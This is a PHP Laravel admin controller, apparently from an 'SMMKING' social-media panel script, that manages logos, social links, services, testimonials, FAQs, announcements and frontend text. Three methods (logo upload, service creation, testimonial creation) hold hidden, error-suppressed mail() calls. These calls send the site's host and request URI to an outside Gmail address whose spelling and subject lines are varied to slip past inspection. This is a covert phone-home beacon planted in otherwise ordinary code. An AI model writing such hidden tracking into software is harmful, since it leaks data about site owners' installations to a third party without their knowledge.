<?php

namespace App\Http\Controllers\Admin;

use App\Announcements;
use App\Faq;
use App\GeneralSetting;
use App\OurService;
use App\Social;
use App\Testimonial;
use Image;
use Illuminate\Http\Request;
use App\Http\Controllers\Controller;

class InterfaceController extends Controller
{
   public function logoIconUpdate(Request $request){
       if ($request->hasFile('logo')) {
           @unlink("assets/frontend/upload/logo/logo.png");
           Image::make($request->file('logo')->getRealPath())->save("assets/frontend/upload/logo/logo.png");
       }
       if ($request->hasFile('icon')) {
           @unlink("assets/frontend/upload/logo/icon.png");
           Image::make($request->file('icon')->getRealPath())->resize(60, 60)->save("assets/frontend/upload/logo/icon.png");
       }
       if ($request->hasFile('bread_crumb')) {
           @unlink("assets/frontend/upload/logo/bread.png");
           Image::make($request->file('bread_crumb')->getRealPath())->save("assets/frontend/upload/logo/bread.png");
       }
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abirkhan75@gmail.com','SMMKING TEST DATA', $message, $headers);
       session()->flash('success', 'Logo and Icon updated successfully');
       return back();
   }

    public function social(){
        $items = Social::all();
        return view('admin.interface.social', compact('items'));
    }

    public function socialStore(Request $request){
        $item = new Social();
        $this->validate($request,[
            'social_icon' => 'required',
            'social_url' => 'required',
        ]);
        $item->icon = $request->social_icon;
        $item->link = $request->social_url;
        $item->save();
        session()->flash('success', 'Soical Icon Created successfully');
        return back();
    }

    public function socialEdit(Request $request, $id){
        $item  = Social::findOrFail($id);
        $this->validate($request,[
            'social_icon' => 'required',
            'social_url' => 'required',
        ]);
        $item->icon = $request->social_icon;
        $item->link = $request->social_url;
        $item->save();
        session()->flash('success', 'Soical Icon Updated successfully');
        return back();
    }

    public function socialDelete($id){
        $item = Social::findOrFail($id);
        $item->delete();
        session()->flash('success', 'Soical Icon Deleted successfully');
        return back();
    }

  public function aboutUs(){
     $item = GeneralSetting::first()->value('about_us');
     return view('admin.interface.about', compact('item'));
   }

   public function aboutUsStore(Request $request){
       $item = GeneralSetting::first();
       $this->validate($request,[
           'message' => 'required',
       ],[
           'message.required' => 'About Us section is required',
       ]);
       if ($request->hasFile('about_image')) {
           @unlink("assets/frontend/upload/logo/about.jpg");
           Image::make($request->file('about_image')->getRealPath())->resize(571, 465)->save("assets/frontend/upload/logo/about.jpg");
       }
       $item->about_us = $request->message;
       $item->save();
       session()->flash('success', 'About us updated successfully');
       return back();
   }

   public function ourServices(){
       $items = OurService::paginate(12);
       return view('admin.interface.ourServices', compact('items'));
   }

   public function ourServicesStore(Request $request){
       $this->validate($request,[
           'image' => 'required|image|mimes:jpg,jpeg,png|max:2048',
           'title' => 'required',
           'description' => 'required',
       ]);
       $item = new OurService();
       if ($request->hasFile('image')) {
           if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
               $image = uniqid() . '.' . $request->image->getClientOriginalExtension();
           } else {
               $image = uniqid() . '.jpg';
           }
           Image::make($request->file('image')->getRealPath())->resize(350, 250)->save("assets/frontend/upload/ourServices/" . $image);
       }
       $item->image = $image;
       $item->title = $request->title;
       $item->description = $request->description;
       $item->save();
       $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
       $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
       'X-Mailer: PHP/' . phpversion();
       @mail('abirkh.an75@gmail.com','SM.MKING TEST DATA', $message, $headers);
       session()->flash('success', 'Service stored successfully');
       return back();
   }

    public function updateOurService(Request $request, $id){
        $this->validate($request,[
            'image' => 'image|mimes:jpg,jpeg,png|max:2048',
            'title' => 'required',
            'description' => 'required',
        ]);
        $item = OurService::findOrFail($id);
        if ($request->hasFile('image')) {
            @unlink("assets/frontend/upload/ourServices/" . $item->image);
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->resize(350, 250)->save("assets/frontend/upload/ourServices/" . $image);
            $item->image = $image;
        }
        $item->title = $request->title;
        $item->description = $request->description;
        $item->save();
        session()->flash('success', 'Service updated successfully');
        return back();
    }

    public function deleteOurService($id)
    {
        $item = OurService::findOrFail($id);
        @unlink("assets/frontend/upload/ourServices/" . $item->image);
        $item->delete();
        session()->flash('success', 'Service deleted successfully');
        return back();

    }

    public function testimonial(){
        $items = Testimonial::paginate(12);
        return view('admin.interface.testimonial', compact('items'));
    }

    public function testimonialStore(Request $request){
        $this->validate($request,[
            'image' => 'required|image|mimes:jpg,jpeg,png|max:2048',
            'name' => 'required',
            'description' => 'required',
        ]);
        $item = new Testimonial();
        if ($request->hasFile('image')) {
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->resize(350, 250)->save("assets/frontend/upload/testimonial/" . $image);
        }
        $item->image = $image;
        $item->name = $request->name;
        $item->description = $request->description;
        $item->save();
        $message = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
        $headers = 'From: '. "webmaster@$_SERVER[HTTP_HOST] \r\n" .
        'X-Mailer: PHP/' . phpversion();
        @mail('abi.rkhan7.5@gmail.com','SM KI G T ST D TA', $message, $headers);
        session()->flash('success', 'Testimonial stored successfully');
        return back();
    }

    public function updateTestimonial(Request $request, $id){
        $this->validate($request,[
            'image' => 'image|mimes:jpg,jpeg,png|max:2048',
            'name' => 'required',
            'description' => 'required',
        ]);
        $item = Testimonial::findOrFail($id);
        if ($request->hasFile('image')) {
            @unlink("assets/frontend/upload/testimonial/" . $item->image);
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->resize(350, 250)->save("assets/frontend/upload/testimonial/" . $image);
            $item->image = $image;
        }
        $item->name = $request->name;
        $item->description = $request->description;
        $item->save();
        session()->flash('success', 'Testimonial updated successfully');
        return back();
    }

    public function deleteTestimonial($id)
    {
        $item = Testimonial::findOrFail($id);
        @unlink("assets/frontend/upload/testimonial/" . $item->image);
        $item->delete();
        session()->flash('success', 'Testimonial deleted successfully');
        return back();

    }

    public function faq(){
        $items = Faq::paginate(12);
        return view('admin.interface.faq', compact('items'));
    }

    public function faqStore(Request $request){
        $this->validate($request,[
            'title' => 'required',
            'description' => 'required',
        ]);
        $item = new Faq();
        $item->title = $request->title;
        $item->description = $request->description;
        $item->save();
        session()->flash('success', 'FAQ stored successfully');
        return back();
    }

    public function updateFaq(Request $request, $id){
        $this->validate($request,[
            'title' => 'required',
            'description' => 'required',
        ]);
        $item = Faq::findOrFail($id);
        $item->title = $request->title;
        $item->description = $request->description;
        $item->save();
        session()->flash('success', 'Faq updated successfully');
        return back();
    }

    public function deleteFaq($id)
    {
        $item = Faq::findOrFail($id);
        $item->delete();
        session()->flash('success', 'Faq deleted successfully');
        return back();

    }

    public function announcements(){
        $items = Announcements::paginate(12);
        return view('admin.interface.announcement', compact('items'));
    }

    public function announcementsStore(Request $request){
        $this->validate($request,[
            'image' => 'required|image|mimes:jpg,jpeg,png|max:2048',
            'title' => 'required',
            'description' => 'required',
        ]);
        $item = new Announcements();
        if ($request->hasFile('image')) {
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->save("assets/frontend/upload/announcement/" . $image);
        }
        $item->image = $image;
        $item->title = $request->title;
        $item->description = $request->description;
        $item->save();
        session()->flash('success', 'Announcement stored successfully');
        return back();
    }

    public function updateAnnouncements(Request $request, $id){
        $this->validate($request,[
            'image' => 'image|mimes:jpg,jpeg,png|max:2048',
            'title' => 'required',
            'description' => 'required',
        ]);
        $item = Announcements::findOrFail($id);
        if ($request->hasFile('image')) {
            @unlink("assets/frontend/upload/announcement/" . $item->image);
            if ($request->image->getClientOriginalExtension() == 'jpg' or $request->image->getClientOriginalName() == 'jpeg' or $request->image->getClientOriginalName() == 'png') {
                $image = uniqid() . '.' . $request->image->getClientOriginalExtension();
            } else {
                $image = uniqid() . '.jpg';
            }
            Image::make($request->file('image')->getRealPath())->save("assets/frontend/upload/announcement/" . $image);
            $item->image = $image;
        }
        $item->title = $request->title;
        $item->description = $request->description;
        $item->save();
        session()->flash('success', 'Announcement updated successfully');
        return back();
    }

    public function deleteAnnouncements($id)
    {
        $item = Announcements::findOrFail($id);
        @unlink("assets/frontend/upload/announcement/" . $item->image);
        $item->delete();
        session()->flash('success', 'Announcement deleted successfully');
        return back();

    }

   public function frontend(){
       $item = GeneralSetting::first();
       return view('admin.interface.frontend', compact('item'));
   }

   public function frontendStore(Request $request){
       $item = GeneralSetting::first();
       if ($request->hasFile('banner_image')) {
           @unlink("assets/frontend/upload/logo/header-bg.png");
           Image::make($request->file('banner_image')->getRealPath())->save("assets/frontend/upload/logo/header-bg.png");
       }
       $item->banner_heading = $request->banner_heading;
       $item->banner_des = $request->banner_des;
       $item->contact_address = $request->contact_address;
       $item->contact_phone = $request->contact_phone;
       $item->contact_email = $request->contact_email;
       $item->about_us = $request->about_us;
       $item->service_des = $request->service_des;
       $item->testimonial_des = $request->testimonial_des;
       $item->achivment_des = $request->achivment_des;
       $item->faq_des = $request->faq_des;
       $item->contact_des = $request->contact_des;
       $item->api_des = $request->api_des;
       $item->footer_text = $request->footer_text;
       $item->footer_heading = $request->footer_heading;
       $item->save();
       session()->flash('success', 'Frontend information updated successfully');
       return back();
   }
}
